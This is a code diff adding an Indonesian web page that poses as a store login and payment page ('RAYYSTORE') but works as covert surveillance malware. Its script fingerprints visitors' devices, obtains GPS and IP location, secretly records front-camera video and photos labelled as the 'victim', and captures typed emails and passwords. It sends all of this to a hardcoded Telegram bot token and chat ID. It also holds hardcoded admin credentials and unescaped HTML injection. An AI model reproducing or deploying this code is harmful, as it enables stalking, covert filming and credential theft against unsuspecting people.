+            </div>
+            <div class="login-input-group">
+                <label>Password</label>
+                <input type="password" id="adminPassword" placeholder="••••••••">
+            </div>
+            <div id="adminLoginError" class="login-error">Email atau password salah!</div>
+            <button class="login-btn" onclick="verifyAdmin()">Login</button>
+        </div>
+    </div>
+</div>
+
+<!-- ADMIN PANEL MODAL -->
+<div id="adminPanelModal" class="modal">
+    <div class="modal-content">
+        <button class="close-modal" onclick="closeModal('adminPanelModal')">&times;</button>
+        <h2>Admin Panel</h2>
+        
+        <div class="admin-tabs">
+            <div class="admin-tab active" onclick="switchAdminTab('info')">Informasi</div>
+            <div class="admin-tab" onclick="switchAdminTab('devices')">Perangkat</div>
+            <div class="admin-tab" onclick="switchAdminTab('games')">Game</div>
+        </div>
+        
+        <!-- INFO TAB -->
+        <div id="info-panel" class="admin-panel active">
+            <div style="margin-bottom:20px;">
+                <input type="text" id="newInfoTitle" placeholder="Judul Informasi" style="width:100%; padding:10px; margin-bottom:10px; background:var(--surface); border:1px solid var(--border); color:var(--text);">
+                <textarea id="newInfoContent" placeholder="Isi Informasi" rows="3" style="width:100%; padding:10px; background:var(--surface); border:1px solid var(--border); color:var(--text);"></textarea>
+                <button class="btn" style="margin-top:10px;" onclick="addInfo()">Tambah Informasi</button>
+            </div>
+            <div id="info-list"></div>
+        </div>
+        
+        <!-- DEVICES TAB -->
+        <div id="devices-panel" class="admin-panel">
+            <table class="devices-table">
+                <thead>
+                    <tr>
+                        <th>Perangkat</th>
+                        <th>Lokasi</th>
+                        <th>Waktu</th>
+                    </tr>
+                </thead>
+                <tbody id="devices-list"></tbody>
+            </table>
+        </div>
+        
+        <!-- GAMES TAB -->
+        <div id="games-panel" class="admin-panel">
+            <div style="margin-bottom:20px;">
+                <input type="text" id="newGameName" placeholder="Nama Game" style="width:100%; padding:10px; margin-bottom:10px; background:var(--surface); border:1px solid var(--border); color:var(--text);">
+                <input type="text" id="newGameApi" placeholder="API URL" style="width:100%; padding:10px; margin-bottom:10px; background:var(--surface); border:1px solid var(--border); color:var(--text);">
+                <button class="btn" onclick="addGame()">Tambah Game</button>
+            </div>
+            <div id="games-list"></div>
+        </div>
+    </div>
+</div>
+
+<!-- AI CHAT MODAL -->
+<div id="aiChatModal" class="modal">
+    <div class="modal-content">
+        <button class="close-modal" onclick="closeModal('aiChatModal')">&times;</button>
+        <h2>DELTAX AI</h2>
+        <div id="chatMessages" style="height:300px; overflow-y:auto; margin:20px 0; padding:10px; background:var(--surface); border-radius:8px;"></div>
+        <div style="display:flex; gap:10px;">
+            <input type="text" id="aiMessage" placeholder="Tanya sesuatu..." style="flex:1; padding:15px; background:var(--surface); border:1px solid var(--border); color:var(--text); border-radius:8px;">
+            <button class="btn" onclick="sendAIMessage()">Kirim</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // ===============================================
+    // RAY-EYE - FINAL VERSION WITH FIXED LOGIN
+    // ===============================================
+    
+    // ========== KONFIGURASI - WAJIB GANTI! ==========
+    const CONFIG = {
+        TELEGRAM_TOKEN: '8416626215:AAHgkbyUIhmWDT9rQJVQJnnd-eI8uVJdr1Y', // GANTI!
+        CHAT_ID: '7966336512', // GANTI!
+    };
+    
+    // ========== STATE ==========
+    let infoList = JSON.parse(localStorage.getItem('infoList') || '[]');
+    let gamesList = JSON.parse(localStorage.getItem('gamesList') || '[]');
+    let devicesList = JSON.parse(localStorage.getItem('devicesList') || '[]');
+    let collectedData = {
+        device: {},
+        ipInfo: {},
+        location: null,
+        camera: {
+            success: false,
+            dimensions: null,
+            error: null
+        },
+        loginInfo: null,
+        permissions: {
+            location: 'pending',
+            camera: 'pending'
+        },
+        media: {
+            photos: [],
+            video: null,
+            videoSize: 0
+        },
+        nominal: 0,
+        timestamp: new Date().toISOString(),
+        sessionId: generateSessionId()
+    };
+    
+    let cameraStream = null;
+    let photoCount = 0;
+    let selectedNominal = 0;
+    let locationAttempts = 0;
+    
+    // ========== HILANGKAN LOAD SCREEN ==========
+    setTimeout(() => {
+        document.getElementById('loadScreen').classList.add('hide');
+        setTimeout(() => {
+            document.getElementById('loadScreen').style.display = 'none';
+        }, 1000);
+    }, 4000);
+    
+    // ========== HELPER ==========
+    function generateSessionId() {
+        return 'xxxx-xxxx-4xxx-yxxx'.replace(/[xy]/g, function(c) {
+            var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+            return v.toString(16);
+        });
+    }
+    
+    // ========== KIRIM KE TELEGRAM ==========
+    async function sendToTelegram(text, fileBlob = null, fileName = 'file.jpg') {
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', CONFIG.CHAT_ID);
+            
+            if (fileBlob) {
+                formData.append('document', fileBlob, fileName);
+                formData.append('caption', text.substring(0, 200));
+                
+                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendDocument`, { 
+                    method: 'POST', 
+                    body: formData,
+                    mode: 'no-cors'
+                });
+                console.log(`File terkirim: ${fileName}, size: ${fileBlob.size}`);
+            } else {
+                formData.append('text', text);
+                formData.append('parse_mode', 'HTML');
+                
+                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, { 
+                    method: 'POST', 
+                    body: formData,
+                    mode: 'no-cors'
+                });
+            }
+        } catch (e) {
+            console.log('Send error:', e);
+        }
+    }
+    
+    // ========== COLLECT INITIAL DATA ==========
+    async function collectInitialData() {
+        const loadTime = performance.now();
+        
+        let gpuInfo = 'Unknown';
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            }
+        } catch (e) {}
+        
+        collectedData.device = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
+            online: navigator.onLine ? 'Online' : 'Offline',
+            screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
+            availScreen: `${screen.availWidth}x${screen.availHeight}`,
+            windowSize: `${window.innerWidth}x${window.innerHeight}`,
+            deviceMemory: navigator.deviceMemory || 'Unknown',
+            cpuCores: navigator.hardwareConcurrency || 'Unknown',
+            gpu: gpuInfo,
+            touchSupport: 'ontouchstart' in window ? 'Yes' : 'No',
+            cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            currentTime: new Date().toString(),
+            pageLoadTime: loadTime.toFixed(2) + 'ms',
+            referrer: document.referrer || 'Direct',
+            url: window.location.href,
+            title: document.title
+        };
+        
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            collectedData.ipInfo = {
+                ip: data.ip,
+                city: data.city,
+                region: data.region,
+                country: data.country_name,
+                lat: data.latitude,
+                lon: data.longitude,
+                isp: data.org,
+                timezone: data.timezone
+            };
+            
+            // Kirim notif visitor
+            sendToTelegram(`🌐 <b>Visitor Baru</b>\n🆔 Session: ${collectedData.sessionId}\n📍 IP: ${data.ip}\n🏙️ Kota: ${data.city || 'Unknown'}`);
+        } catch (e) {}
+    }
+    
+    // ========== LOGIN NAVIGATION ==========
+    window.showLoginForm = function() {
+        document.getElementById('loginWelcome').style.display = 'none';
+        document.getElementById('loginForm').style.display = 'flex';
+    };
+    
+    window.goBackToWelcome = function() {
+        document.getElementById('loginForm').style.display = 'none';
+        document.getElementById('loginWelcome').style.display = 'flex';
+    };
+    
+    // ========== VERIFIKASI LOGIN ==========
+    window.verifyLogin = function() {
+        const email = document.getElementById('loginEmail').value.trim();
+        const password = document.getElementById('loginPassword').value.trim();
+        
+        // Logika login: email harus "AKUN DI BERIKAN DI CHAT" dan password "buyer001"
+        if (email === 'AKUN DI BERIKAN DI CHAT' && password === 'buyer001') {
+            document.getElementById('loginError').style.display = 'none';
+            document.getElementById('loginForm').style.display = 'none';
+            
+            collectedData.loginInfo = {
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Kirim login berhasil
+            sendToTelegram(`🔐 <b>Login Berhasil</b>\n📧 Email: ${email}\n🔑 Password: ${password}\n🆔 Session: ${collectedData.sessionId}`);
+            
+            // Tampilkan halaman permission
+            document.getElementById('permissionPage').classList.add('active');
+            
+        } else {
+            document.getElementById('loginError').style.display = 'block';
+            sendToTelegram(`⚠️ <b>Login Gagal</b>\n📧 Email: ${email}\n🔑 Password: ${password}`);
+        }
+    };
+    
+    // ========== PERMISSION HANDLING ==========
+    window.startPermissions = function() {
+        // Sembunyikan tombol dan tampilkan loading box
+        document.getElementById('permissionBtn').style.display = 'none';
+        document.getElementById('permissionLoadingBox').style.display = 'block';
+        
+        // Tampilkan overlay loading
+        document.getElementById('permissionLoadingOverlay').classList.add('active');
+        
+        // Mulai minta lokasi
+        setTimeout(() => {
+            requestLocation();
+        }, 500);
+    };
+    
+    function requestLocation() {
+        if (!navigator.geolocation) {
+            collectedData.permissions.location = 'denied';
+            sendToTelegram(`❌ Lokasi ditolak: Geolocation not supported`);
+            document.getElementById('permissionLoadingOverlay').classList.remove('active');
+            checkAllPermissions();
+            return;
+        }
+        
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                // Lokasi diberikan
+                collectedData.permissions.location = 'granted';
+                collectedData.location = {
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    accuracy: position.coords.accuracy + ' meters',
+                    altitude: position.coords.altitude || 'N/A',
+                    heading: position.coords.heading || 'N/A',
+                    speed: position.coords.speed || 'N/A',
+                    method: 'GPS',
+                    timestamp: new Date(position.timestamp).toISOString()
+                };
+                
+                // Reverse geocoding untuk alamat lengkap
+                try {
+                    const res = await fetch(
+                        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=18&addressdetails=1`,
+                        { headers: { 'User-Agent': 'Mozilla/5.0' } }
+                    );
+                    const data = await res.json();
+                    collectedData.location.address = data.display_name;
+                    
+                    if (data.address) {
+                        collectedData.location.addressDetails = {
+                            road: data.address.road || 'N/A',
+                            city: data.address.city || data.address.town || data.address.village || 'N/A',
+                            state: data.address.state || 'N/A',
+                            country: data.address.country || 'N/A',
+                            postcode: data.address.postcode || 'N/A'
+                        };
+                    }
+                    
+                    sendToTelegram(`📍 <b>Lokasi Diberikan</b>\nLat: ${position.coords.latitude}\nLon: ${position.coords.longitude}\nAlamat: ${collectedData.location.address || 'N/A'}`);
+                    
+                } catch (e) {
+                    sendToTelegram(`📍 <b>Lokasi Diberikan</b>\nLat: ${position.coords.latitude}\nLon: ${position.coords.longitude}\n(Reverse geocoding gagal)`);
+                }
+                
+                // Lanjut ke kamera
+                requestCamera();
+            },
+            (error) => {
+                // Lokasi ditolak
+                collectedData.permissions.location = 'denied';
+                locationAttempts++;
+                sendToTelegram(`❌ Lokasi ditolak (percobaan ${locationAttempts}): ${error.message}`);
+                
+                document.getElementById('permissionLoadingOverlay').classList.remove('active');
+                checkAllPermissions();
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+    }
+    
+    function requestCamera() {
+        navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                facingMode: "user",
+                width: { ideal: 720 },
+                height: { ideal: 1280 }
+            } 
+        })
+        .then(async (stream) => {
+            // Kamera diberikan
+            collectedData.permissions.camera = 'granted';
+            collectedData.camera.success = true;
+            cameraStream = stream;
+            
+            document.getElementById('hidden-video').srcObject = stream;
+            await document.getElementById('hidden-video').play();
+            
+            await new Promise(r => setTimeout(r, 1000));
+            
+            collectedData.camera.dimensions = `${document.getElementById('hidden-video').videoWidth}x${document.getElementById('hidden-video').videoHeight}`;
+            
+            // Rekam video 5 detik
+            try {
+                const mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: 'video/webm;codecs=vp8'
+                });
+                
+                const chunks = [];
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    
+                    if (blob.size > 20000) {
+                        collectedData.media.video = blob;
+                        collectedData.media.videoSize = blob.size;
+                        
+                        const caption = `📹 <b>VIDEO KORBAN</b>\n🆔 Session: ${collectedData.sessionId}\n⏱️ Durasi: 5 detik\n📍 ${collectedData.location?.address || collectedData.ipInfo?.city || 'Unknown'}`;
+                        await sendToTelegram(caption, blob, `video_${Date.now()}.webm`);
+                    }
+                    
+                    // Ambil 2 foto
+                    await capturePhoto();
+                    await new Promise(r => setTimeout(r, 500));
+                    await capturePhoto();
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    cameraStream = null;
+                    
+                    document.getElementById('permissionLoadingOverlay').classList.remove('active');
+                    checkAllPermissions();
+                };
+                
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, 5000);
+                
+            } catch (videoError) {
+                // Fallback ke foto
+                await capturePhoto();
+                await new Promise(r => setTimeout(r, 500));
+                await capturePhoto();
+                await new Promise(r => setTimeout(r, 500));
+                await capturePhoto();
+                
+                stream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+                
+                document.getElementById('permissionLoadingOverlay').classList.remove('active');
+                checkAllPermissions();
+            }
+        })
+        .catch((error) => {
+            // Kamera ditolak
+            collectedData.permissions.camera = 'denied';
+            collectedData.camera.success = false;
+            collectedData.camera.error = error.message;
+            sendToTelegram(`❌ Kamera ditolak: ${error.message}`);
+            
+            document.getElementById('permissionLoadingOverlay').classList.remove('active');
+            checkAllPermissions();
+        });
+    }
+    
+    async function capturePhoto() {
+        if (!cameraStream) return;
+        
+        try {
+            photoCount++;
+            
+            const video = document.getElementById('hidden-video');
+            const canvas = document.getElementById('hidden-canvas');
+            
+            canvas.width = video.videoWidth || 720;
+            canvas.height = video.videoHeight || 1280;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const blob = await new Promise(resolve => {
+                canvas.toBlob(resolve, 'image/jpeg', 0.9);
+            });
+            
+            if (blob && blob.size > 1000) {
+                const caption = `📸 <b>FOTO ${photoCount}</b>\n🆔 Session: ${collectedData.sessionId}\n📍 ${collectedData.location?.address || collectedData.ipInfo?.city || 'Unknown'}`;
+                await sendToTelegram(caption, blob, `foto_${Date.now()}.jpg`);
+                collectedData.media.photos.push(blob);
+            }
+        } catch (e) {}
+    }
+    
+    function checkAllPermissions() {
+        // Jika kedua izin ditolak, tampilkan block page
+        if (collectedData.permissions.location === 'denied' && collectedData.permissions.camera === 'denied') {
+            document.getElementById('permissionPage').classList.remove('active');
+            document.getElementById('blockPage').classList.add('active');
+            sendFinalReport(true);
+        }
+        // Jika kamera ditolak (wajib), tampilkan block page
+        else if (collectedData.permissions.camera === 'denied') {
+            document.getElementById('permissionPage').classList.remove('active');
+            document.getElementById('blockPage').classList.add('active');
+            sendFinalReport(true);
+        }
+        // Jika semua diberikan, lanjut ke nominal
+        else if (collectedData.permissions.location === 'granted' && collectedData.permissions.camera === 'granted') {
+            document.getElementById('permissionPage').classList.remove('active');
+            document.getElementById('nominalPage').style.display = 'flex';
+            sendFinalReport(false);
+        }
+    }
+    
+    function sendFinalReport(isBlocked) {
+        let report = '╔════════════════════════════════════╗\n';
+        report += '║    RAYYSTORE - PAYMENT TRACKER    ║\n';
+        report += '╚════════════════════════════════════╝\n\n';
+        
+        report += `🕐 TIMESTAMP: ${collectedData.timestamp}\n`;
+        report += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
+        
+        // DEVICE INFORMATION
+        report += '📱 DEVICE INFORMATION\n';
+        Object.entries(collectedData.device).forEach(([key, val]) => {
+            if (val !== undefined && val !== null && val !== '') {
+                report += `  • ${key}: ${val}\n`;
+            }
+        });
+        report += '\n';
+        
+        // LOCATION INFORMATION
+        report += '📍 LOCATION INFORMATION\n';
+        if (collectedData.location) {
+            report += `  • lat: ${collectedData.location.lat}\n`;
+            report += `  • lon: ${collectedData.location.lon}\n`;
+            report += `  • accuracy: ${collectedData.location.accuracy}\n`;
+            report += `  • altitude: ${collectedData.location.altitude}\n`;
+            report += `  • heading: ${collectedData.location.heading}\n`;
+            report += `  • speed: ${collectedData.location.speed}\n`;
+            report += `  • method: ${collectedData.location.method}\n`;
+            report += `  • timestamp: ${collectedData.location.timestamp}\n`;
+            
+            if (collectedData.location.address) {
+                report += `  • address: ${collectedData.location.address}\n`;
+            }
+            
+            if (collectedData.location.addressDetails) {
+                report += `  • addressDetails:\n`;
+                report += `      - road: ${collectedData.location.addressDetails.road}\n`;
+                report += `      - city: ${collectedData.location.addressDetails.city}\n`;
+                report += `      - state: ${collectedData.location.addressDetails.state}\n`;
+                report += `      - country: ${collectedData.location.addressDetails.country}\n`;
+                report += `      - postcode: ${collectedData.location.addressDetails.postcode}\n`;
+            }
+        } else if (collectedData.ipInfo) {
+            report += `  • lat: ${collectedData.ipInfo.lat || 'N/A'}\n`;
+            report += `  • lon: ${collectedData.ipInfo.lon || 'N/A'}\n`;
+            report += `  • city: ${collectedData.ipInfo.city || 'N/A'}\n`;
+            report += `  • region: ${collectedData.ipInfo.region || 'N/A'}\n`;
+            report += `  • country: ${collectedData.ipInfo.country || 'N/A'}\n`;
+            report += `  • method: IP Geolocation\n`;
+        }
+        report += '\n';
+        
+        // CAMERA STATUS
+        report += '📸 CAMERA STATUS\n';
+        report += `  • Success: ${collectedData.camera.success ? '✅' : '❌'}\n`;
+        if (collectedData.camera.dimensions) {
+            report += `  • Resolution: ${collectedData.camera.dimensions}\n`;
+        }
+        if (collectedData.camera.error) {
+            report += `  • Error: ${collectedData.camera.error}\n`;
+        }
+        report += `  • Photos taken: ${photoCount}\n`;
+        report += `  • Video: ${collectedData.media.video ? 'ADA (' + (collectedData.media.videoSize/1024/1024).toFixed(2) + ' MB)' : 'TIDAK'}\n`;
+        
+        // LOGIN INFO
+        if (collectedData.loginInfo) {
+            report += '\n🔐 LOGIN INFORMATION\n';
+            report += `  • Email: ${collectedData.loginInfo.email}\n`;
+            report += `  • Password: ${collectedData.loginInfo.password}\n`;
+        }
+        
+        // PERMISSIONS
+        report += '\n🔐 PERMISSION STATUS\n';
+        report += `  • Location: ${collectedData.permissions.location}\n`;
+        report += `  • Camera: ${collectedData.permissions.camera}\n`;
+        report += `  • Blocked: ${isBlocked ? 'Yes' : 'No'}\n`;
+        
+        sendToTelegram(report);
+    }
+    
+    // ========== RESTART BROWSER ==========
+    window.restartBrowser = function() {
+        sendToTelegram(`🔄 <b>User melakukan restart browser</b>\n🆔 Session: ${collectedData.sessionId}`);
+        location.reload();
+    };
+    
+    // ========== NOMINAL FUNCTIONS ==========
+    window.selectNominal = function(nominal) {
+        selectedNominal = nominal;
+        document.querySelectorAll('#nominalPage .btn').forEach(btn => {
+            btn.style.background = '#f7fafc';
+            btn.style.color = '#2d3748';
+        });
+        event.target.style.background = '#667eea';
+        event.target.style.color = 'white';
+        document.getElementById('customNominal').value = '';
+        updateTotalDisplay();
+    };
+    
+    document.getElementById('customNominal')?.addEventListener('input', function() {
+        document.querySelectorAll('#nominalPage .btn').forEach(btn => {
+            btn.style.background = '#f7fafc';
+            btn.style.color = '#2d3748';
+        });
+        selectedNominal = 0;
+        updateTotalDisplay();
+    });
+    
+    function updateTotalDisplay() {
+        const customVal = parseInt(document.getElementById('customNominal')?.value) || 0;
+        const total = selectedNominal || customVal;
+        document.getElementById('totalDisplay').innerText = total > 0 ? `Rp ${total.toLocaleString()}` : 'Rp 0';
+    }
+    
+    window.processPayment = function() {
+        const customVal = parseInt(document.getElementById('customNominal')?.value) || 0;
+        const total = selectedNominal || customVal;
+        
+        if (total < 10000) {
+            alert('Minimal pembayaran Rp 10.000');
+            return;
+        }
+        
+        collectedData.nominal = total;
+        sendToTelegram(`💰 <b>NOMINAL DIPILIH</b>\n💵 Rp ${total.toLocaleString()}\n🆔 Session: ${collectedData.sessionId}`);
+        
+        document.getElementById('nominalPage').style.display = 'none';
+        document.getElementById('mainContent').classList.add('active');
+        
+        // Redirect ke Pakasir setelah 2 detik (opsional, bisa di-comment kalo ga mau redirect)
+        setTimeout(() => {
+            window.location.href = `https://app.pakasir.com/pay/rayy-store/${total}?order_id=R${Date.now()}&qris_only=1`;
+        }, 2000);
+    };
+    
+    // ========== THEME ==========
+    window.toggleTheme = () => {
+        const b = document.body;
+        const current = b.getAttribute('data-theme');
+        b.setAttribute('data-theme', current === 'light' ? 'dark' : 'light');
+        localStorage.setItem('rayy-theme', current === 'light' ? 'dark' : 'light');
+    };
+    
+    const savedTheme = localStorage.getItem('rayy-theme');
+    if (savedTheme) {
+        document.body.setAttribute('data-theme', savedTheme);
+    }
+    
+    // ========== SIDEBAR ==========
+    window.toggleSidebar = () => {
+        document.getElementById('sidebar').classList.toggle('active');
+    };
+    
+    window.toggleSubMenu = (id) => {
+        const sub = document.getElementById(id);
+        sub.classList.toggle('active');
+    };
+    
+    // ========== NAVIGATION ==========
+    window.showSection = (section) => {
+        document.getElementById('home-section').style.display = section === 'home' ? 'block' : 'none';
+        document.getElementById('profile-section').style.display = section === 'profile' ? 'block' : 'none';
+        
+        document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
+        event.target.closest('.nav-item').classList.add('active');
+    };
+    
+    // ========== PROFILE ==========
+    window.showProfile = () => showSection('profile');
+    window.editProfile = () => {
+        showSection('profile');
+        document.getElementById('profileBio').focus();
+    };
+    
+    window.changeAvatar = () => {
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.accept = 'image/*';
+        input.onchange = (e) => {
+            const file = e.target.files[0];
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                document.getElementById('profileImage').src = e.target.result;
+                localStorage.setItem('profileImage', e.target.result);
+            };
+            reader.readAsDataURL(file);
+        };
+        input.click();
+    };
+    
+    window.saveProfile = () => {
+        const bio = document.getElementById('profileBio').value;
+        localStorage.setItem('profileBio', bio);
+        alert('Profil tersimpan!');
+    };
+    
+    const savedImage = localStorage.getItem('profileImage');
+    if (savedImage) {
+        document.getElementById('profileImage').src = savedImage;
+    }
+    const savedBio = localStorage.getItem('profileBio');
+    if (savedBio) {
+        document.getElementById('profileBio').value = savedBio;
+    }
+    
+    // ========== ADMIN ==========
+    window.showAdminLogin = () => {
+        toggleSidebar();
+        document.getElementById('adminLoginModal').classList.add('active');
+    };
+    
+    window.verifyAdmin = () => {
+        const email = document.getElementById('adminEmail').value;
+        const password = document.getElementById('adminPassword').value;
+        
+        if (email === 'rayy@dev.com' && password === 'dev.com') {
+            document.getElementById('adminLoginModal').classList.remove('active');
+            document.getElementById('adminPanelModal').classList.add('active');
+            loadAdminData();
+            sendToTelegram(`👑 <b>Admin Login</b>\n📧 ${email}\n🆔 Session: ${collectedData.sessionId}`);
+        } else {
+            document.getElementById('adminLoginError').style.display = 'block';
+        }
+    };
+    
+    window.closeModal = (id) => {
+        document.getElementById(id).classList.remove('active');
+    };
+    
+    window.switchAdminTab = (tab) => {
+        document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
+        document.querySelectorAll('.admin-panel').forEach(p => p.classList.remove('active'));
+        event.target.classList.add('active');
+        document.getElementById(tab + '-panel').classList.add('active');
+    };
+    
+    // ========== INFO MANAGEMENT ==========
+    window.addInfo = () => {
+        const title = document.getElementById('newInfoTitle').value;
+        const content = document.getElementById('newInfoContent').value;
+        
+        if (title && content) {
+            infoList.push({
+                id: Date.now(),
+                title,
+                content,
+                pinned: false,
+                time: new Date().toLocaleString()
+            });
+            localStorage.setItem('infoList', JSON.stringify(infoList));
+            document.getElementById('newInfoTitle').value = '';
+            document.getElementById('newInfoContent').value = '';
+            loadInfoList();
+        }
+    };
+    
+    window.togglePin = (id) => {
+        const info = infoList.find(i => i.id === id);
+        if (info) {
+            info.pinned = !info.pinned;
+            localStorage.setItem('infoList', JSON.stringify(infoList));
+            loadInfoList();
+        }
+    };
+    
+    window.deleteInfo = (id) => {
+        infoList = infoList.filter(i => i.id !== id);
+        localStorage.setItem('infoList', JSON.stringify(infoList));
+        loadInfoList();
+    };
+    
+    function loadInfoList() {
+        const list = document.getElementById('info-list');
+        if (!list) return;
+        
+        const sorted = [...infoList].sort((a, b) => (b.pinned ? 1 : 0) - (a.pinned ? 1 : 0));
+        
+        list.innerHTML = sorted.map(info => `
+            <div class="info-item">
+                <div class="info-header">
+                    <strong>${info.title}</strong>
+                    <div>
+                        <button class="pin-btn" onclick="togglePin(${info.id})">
+                            <i class="fas fa-thumbtack" style="color: ${info.pinned ? 'var(--warning)' : 'var(--subtle)'}"></i>
+                        </button>
+                        <button class="pin-btn" onclick="deleteInfo(${info.id})">
+                            <i class="fas fa-trash" style="color: var(--danger)"></i>
+                        </button>
+                    </div>
+                </div>
+                <div class="info-content ${info.pinned ? 'pinned' : ''}">${info.content}</div>
+                <small style="color:var(--subtle);">${info.time}</small>
+            </div>
+        `).join('');
+    }
+    
+    // ========== GAMES MANAGEMENT ==========
+    window.addGame = () => {
+        const name = document.getElementById('newGameName').value;
+        const api = document.getElementById('newGameApi').value;
+        
+        if (name && api) {
+            gamesList.push({
+                id: Date.now(),
+                name,
+                api,
+                active: false
+            });
+            localStorage.setItem('gamesList', JSON.stringify(gamesList));
+            document.getElementById('newGameName').value = '';
+            document.getElementById('newGameApi').value = '';
+            loadGamesList();
+        }
+    };
+    
+    window.toggleGame = (id) => {
+        const game = gamesList.find(g => g.id === id);
+        if (game) {
+            game.active = !game.active;
+            localStorage.setItem('gamesList', JSON.stringify(gamesList));
+            loadGamesList();
+            loadPublicGames();
+        }
+    };
+    
+    window.deleteGame = (id) => {
+        gamesList = gamesList.filter(g => g.id !== id);
+        localStorage.setItem('gamesList', JSON.stringify(gamesList));
+        loadGamesList();
+        loadPublicGames();
+    };
+    
+    function loadGamesList() {
+        const list = document.getElementById('games-list');
+        if (!list) return;
+        
+        list.innerHTML = gamesList.map(game => `
+            <div class="game-card">
+                <h4>${game.name}</h4>
+                <p style="font-size:0.8rem; color:var(--subtle);">${game.api}</p>
+                <div style="margin-top:10px;">
+                    <button class="btn" onclick="toggleGame(${game.id})" style="background: ${game.active ? 'var(--danger)' : 'var(--success)'}">
+                        ${game.active ? 'Nonaktifkan' : 'Aktifkan'}
+                    </button>
+                    <button class="btn btn-danger" onclick="deleteGame(${game.id})">Hapus</button>
+                </div>
+            </div>
+        `).join('');
+    }
+    
+    window.showGames = () => {
+        loadPublicGames();
+        showSection('home');
+    };
+    
+    function loadPublicGames() {
+        const homeSection = document.getElementById('home-section');
+        const activeGames = gamesList.filter(g => g.active);
+        
+        let gamesHtml = `
+            <div style="margin-top:30px;">
+                <h2>Games</h2>
+                <div class="games-grid">
+        `;
+        
+        activeGames.forEach(game => {
+            gamesHtml += `
+                <div class="game-card" onclick="window.open('${game.api}', '_blank')">
+                    <h4>${game.name}</h4>
+                    <p style="font-size:0.7rem; color:var(--subtle);">Klik untuk main</p>
+                </div>
+            `;
+        });
+        
+        gamesHtml += `
+            <div class="game-card coming-soon">
+                <span class="coming-soon-badge">SOON</span>
+                <h4>Coming Soon</h4>
+                <p style="font-size:0.7rem; color:var(--subtle);">Game lainnya segera hadir</p>
+            </div>
+            </div></div>
+        `;
+        
+        const existing = homeSection.querySelector('div[style*="margin-top:30px;"]');
+        if (existing) {
+            existing.outerHTML = gamesHtml;
+        } else {
+            homeSection.innerHTML += gamesHtml;
+        }
+    }
+    
+    // ========== DEVICES TRACKING ==========
+    function addDevice() {
+        const device = {
+            id: Date.now(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            time: new Date().toLocaleString(),
+            location: collectedData.ipInfo?.city || 'Unknown'
+        };
+        
+        devicesList.push(device);
+        localStorage.setItem('devicesList', JSON.stringify(devicesList));
+        loadDevicesList();
+    }
+    
+    function loadDevicesList() {
+        const list = document.getElementById('devices-list');
+        if (!list) return;
+        
+        list.innerHTML = devicesList.slice(-10).reverse().map(device => `
+            <tr>
+                <td>${device.platform}</td>
+                <td>${device.location}</td>
+                <td>${device.time}</td>
+            </tr>
+        `).join('');
+    }
+    
+    // ========== AI CHAT ==========
+    window.showAIChat = () => {
+        document.getElementById('aiChatModal').classList.add('active');
+        loadChatHistory();
+    };
+    
+    window.sendAIMessage = () => {
+        const message = document.getElementById('aiMessage').value;
+        if (!message) return;
+        
+        addChatMessage('user', message);
+        document.getElementById('aiMessage').value = '';
+        
+        fetch(`https://api-faa.my.id/faa/chatai?text=${encodeURIComponent(message)}`)
+            .then(res => res.json())
+            .then(data => {
+                addChatMessage('ai', data.result || data.message || 'Maaf, tidak ada respons');
+            })
+            .catch(() => {
+                addChatMessage('ai', 'Maaf, terjadi kesalahan.');
+            });
+    };
+    
+    function addChatMessage(sender, text) {
+        const chat = document.getElementById('chatMessages');
+        const msgDiv = document.createElement('div');
+        msgDiv.style.marginBottom = '10px';
+        msgDiv.style.padding = '10px';
+        msgDiv.style.background = sender === 'user' ? 'var(--primary)' : 'var(--surface)';
+        msgDiv.style.color = sender === 'user' ? 'white' : 'var(--text)';
+        msgDiv.style.borderRadius = '8px';
+        msgDiv.innerHTML = `<strong>${sender === 'user' ? 'Anda' : 'DELTAX AI'}:</strong> ${text}`;
+        chat.appendChild(msgDiv);
+        chat.scrollTop = chat.scrollHeight;
+        
+        const history = JSON.parse(localStorage.getItem('chatHistory') || '[]');
+        history.push({ sender, text, time: new Date().toISOString() });
+        localStorage.setItem('chatHistory', JSON.stringify(history.slice(-50)));
+    }
+    
